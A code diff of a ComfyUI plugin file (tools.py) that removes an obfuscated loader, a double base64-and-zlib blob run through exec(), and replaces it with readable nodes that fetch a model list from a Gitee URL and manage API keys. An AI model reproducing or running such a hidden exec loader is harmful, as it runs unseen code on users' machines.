@@ -1,6 +1,318 @@
-# -*- coding: utf-8 -*-
-import zlib as _z,base64 as _b
-_d=b'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'
-_d=_z.decompress(_b.b64decode(_d))
-_d=_z.decompress(_b.b64decode(_d))
-exec(_d)
+# tools.py
+import os
+import time
+import json
+import requests
+import torch
+import folder_paths
+from server import PromptServer
+from aiohttp import web
+from .utils import tensor_to_pil
+
+# ======================================================================
+# 模型热更新配置中心
+# ======================================================================
+# 【核心修改】：缓存文件现在永久存放在当前节点目录下的 data 文件夹内
+MODELS_CACHE_FILE = os.path.join(os.path.dirname(__file__), "data", "wujiai_local_models_cache.json")
+
+# 指向你的 Gitee 仓库 Raw 链接
+GITEE_MODELS_RAW_URL = "https://gitee.com/jiege777/app-config/raw/master/models.json"
+
+# 终极兜底配置
+DEFAULT_MODELS_CONFIG = {
+    "顶部公告": [
+        "欢迎使用我的工作流，关注B站那颗星星188！",
+    ],
+    "图像模型": [
+        "gemini-3.1-flash-image-preview",
+        "gemini-3-pro-image-preview",
+        "gemini-2.5-flash-image",
+        "doubao-seedream-5-0-260128",
+        "doubao-seedream-4-5-251128",
+        "doubao-seedream-4-0-250828",
+        "gpt-image-1.5-all",
+        "grok-4.2-image",
+        "grok-4.1-image",
+        "grok-4-image"
+    ],
+    "视频模型": [
+        "grok-video-3",
+        "grok-video-3-10s",
+        "grok-video-3-15s",
+        "sora-2",
+        "veo_3_1-fast",
+        "veo_3_1-fast-4K",
+        "veo_3_1-components",
+        "veo_3_1-components-4K"
+    ],
+    "大语言模型": [
+        "gemini-3.1-flash-lite-preview",
+        "gemini-3.1-pro-preview",
+        "gemini-3-flash-preview",
+        "gemini-3-pro-preview",
+        "gemini-2.5-flash-lite",
+        "gpt-5.4",
+        "gpt-5.3-chat-latest",
+        "gpt-5.2",
+        "gpt-5.1",
+        "gpt-5-mini-2025-08-07",
+        "grok-4.1",
+        "grok-4",
+        "grok-4-fast",
+        "doubao-seed-1-8-251228"
+    ]
+}
+
+# 增加两个全局变量，用于内存缓存和频率控制
+_LAST_FETCH_TIME = 0
+_MEMORY_MODELS_CACHE = None
+
+def fetch_models_config():
+    """拉取或读取本地模型配置 (带防封控与内存缓存机制)"""
+    global _LAST_FETCH_TIME, _MEMORY_MODELS_CACHE
+    config = DEFAULT_MODELS_CONFIG
+    
+    # 1. 频率限制：如果距离上次拉取不到 10 秒，直接返回内存数据
+    current_time = time.time()
+    if _MEMORY_MODELS_CACHE and (current_time - _LAST_FETCH_TIME < 10):
+        return _MEMORY_MODELS_CACHE
+    
+    # 2. 尝试从 Gitee 拉取 
+    try:
+        headers = {
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+        }
+        response = requests.get(GITEE_MODELS_RAW_URL, headers=headers, timeout=5)
+        
+        if response.status_code == 200:
+            raw_text = response.text
+            raw_text = raw_text.replace('“', '"').replace('”', '"').replace("‘", "'").replace("’", "'")
+            
+            fetched_data = json.loads(raw_text)
+            
+            if isinstance(fetched_data, dict) and len(fetched_data) > 0:
+                config = fetched_data
+                
+                _MEMORY_MODELS_CACHE = config
+                _LAST_FETCH_TIME = current_time
+                
+                # 【新增】：写入前确保 data 文件夹存在，防止报错
+                os.makedirs(os.path.dirname(MODELS_CACHE_FILE), exist_ok=True)
+                
+                with open(MODELS_CACHE_FILE, 'w', encoding='utf-8') as f:
+                    json.dump(config, f, ensure_ascii=False, indent=4)
+                return config
+        else:
+            print(f"[Wujiai Tools] Gitee 拒绝请求，状态码: {response.status_code}")
+            
+    except Exception as e:
+        print(f"[Wujiai Tools] 从 Gitee 获取模型列表失败: {e}")
+
+    # 3. 兜底：网络失败时，读取本地文件缓存
+    if os.path.exists(MODELS_CACHE_FILE):
+        try:
+            with open(MODELS_CACHE_FILE, 'r', encoding='utf-8') as f:
+                config = json.load(f)
+                _MEMORY_MODELS_CACHE = config 
+        except Exception as e:
+            print(f"[Wujiai Tools] 读取本地缓存失败，使用硬编码默认配置。({e})")
+            
+    return config
+
+@PromptServer.instance.routes.get("/nkxx/wujiai/models_config")
+async def get_models_config(request):
+    config = fetch_models_config()
+    return web.json_response(config)
+
+# ======================================================================
+# 模型独立展示板 (无连线纯视觉节点)
+# ======================================================================
+class WujiaiModelBrowser:
+    CATEGORY = "Nkxx/Tools"
+    
+    RETURN_TYPES = ()
+    FUNCTION = "do_nothing"
+    OUTPUT_NODE = True 
+
+    @classmethod
+    def INPUT_TYPES(cls):
+        config = fetch_models_config()
+        categories = [k for k in config.keys() if k != "顶部公告"] if config else ["未获取到分类"]
+
+        return {
+            "required": {
+                "model_list_display": ("STRING", {"multiline": True, "default": "正在加载最新模型列表..."}),
+                "category": (categories, {"default": categories[0] if categories else ""}),
+            }
+        }
+
+    def do_nothing(self, **kwargs):
+        return {}
+
+
+# ======================================================================
+# API Key 集中管理器 (孤立记事本纯净版)
+# ======================================================================
+class ApiKeyManager:
+    @classmethod
+    def INPUT_TYPES(cls):
+        inputs = {
+            "required": {
+                "active_count": ("INT", {"default": 1, "min": 1, "max": 10, "step": 1, "display": "number"}),
+            },
+            "optional": {}
+        }
+        
+        for i in range(1, 11):
+            inputs["optional"][f"name{i}"] = ("STRING", {"default": f""})
+            inputs["optional"][f"api_key{i}"] = ("STRING", {"default": ""})
+            
+        return inputs
+
+    RETURN_TYPES = ()
+    FUNCTION = "do_nothing"
+    CATEGORY = "Nkxx/Tools"
+    
+    # 设为 True 保证不连线也能被保存到工作流中
+    OUTPUT_NODE = True 
+
+    def do_nothing(self, **kwargs):
+        return {}
+
+
+# ======================================================================
+# 原有的 Tools 节点
+# ======================================================================
+class GroupRunnerConsole:
+    @classmethod
+    def INPUT_TYPES(cls):
+        return {"required": {}}
+    
+    RETURN_TYPES = ()
+    FUNCTION = "do_nothing"
+    CATEGORY = "Nkxx/Tools"
+    OUTPUT_NODE = True 
+
+    def do_nothing(self):
+        return {}
+
+
+class DynamicImageList:
+    @classmethod
+    def INPUT_TYPES(cls):
+        return {
+            "required": {
+                "inputcount": ("INT", {"default": 1, "min": 1, "max": 100, "step": 1, "display": "number"}),
+            }
+        }
+
+    RETURN_TYPES = ("IMAGE",)
+    RETURN_NAMES = ("图像列表 (IMAGE)",)
+    FUNCTION = "combine_to_list"
+    CATEGORY = "Nkxx/Tools"
+
+    def combine_to_list(self, inputcount, **kwargs):
+        images = []
+        for i in range(1, inputcount + 1):
+            key = f"image_{i}"
+            if key in kwargs:
+                incoming = kwargs[key]
+                if incoming is None:
+                    continue
+                if isinstance(incoming, list):
+                    images.extend(incoming)
+                else:
+                    images.append(incoming)
+        if len(images) == 0:
+            return ([],)  
+        return (images,)
+
+
+class SaveImageByFilename:
+    CATEGORY = "Nkxx/Tools"
+    OUTPUT_NODE = True
+    FUNCTION = "execute"
+
+    @classmethod
+    def INPUT_TYPES(cls):
+        return {
+            "required": {
+                "images": ("IMAGE",),
+                "filenames": ("STRING", {"multiline": True}),
+            },
+            "optional": {
+                "output_path": ("STRING", {"default": ""}),
+                "suffix": ("STRING", {"default": ""}),
+            }
+        }
+
+    RETURN_TYPES = ()
+
+    def execute(self, images, filenames, output_path="", suffix=""):
+        pil_images = tensor_to_pil(images)
+        paths = [p.strip() for p in filenames.strip().split('\n') if p.strip()]
+
+        if not paths:
